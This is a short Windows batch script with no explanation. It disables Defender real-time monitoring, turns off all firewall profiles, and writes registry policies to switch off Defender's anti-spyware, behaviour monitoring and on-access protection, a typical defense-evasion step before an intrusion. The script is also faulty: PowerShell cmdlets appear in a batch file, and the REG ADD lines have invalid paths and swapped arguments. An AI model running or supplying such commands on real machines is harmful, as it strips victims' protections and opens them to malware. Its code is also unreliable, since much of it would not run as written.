@ECHO OFF 
Set-MpPreference -DisableRealtimeMonitoring $true
netsh advfirewall set allprofiles state off
netsh firewall set opmode disable
Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled False
Set-NetFirewallProfile -All -Enabled False
REG ADD Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender /v 1 /d "DisableWinDefender" 
REG ADD Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender /v 1 /d "DisableAntiSpyware"
REG ADD Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection /v 1 /d "DisableBehaviorMonitoring"
REG ADD Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection /v 1 /d "DisableOnAccessProtection"
REG ADD Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection /v 1 /d "DisableScanOnRealtimeEnable"
